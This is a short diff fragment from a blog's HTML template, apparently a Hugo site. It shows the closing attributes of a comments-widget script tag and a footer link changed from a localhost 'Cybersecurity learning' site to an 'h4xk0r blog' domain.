+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/">Cybersecurity learning</a></span> · 
+        <span>&copy; 2026 <a href="https://b1ckdoor.com/">h4xk0r blog</a></span> · 
 
     <span>
         Powered by
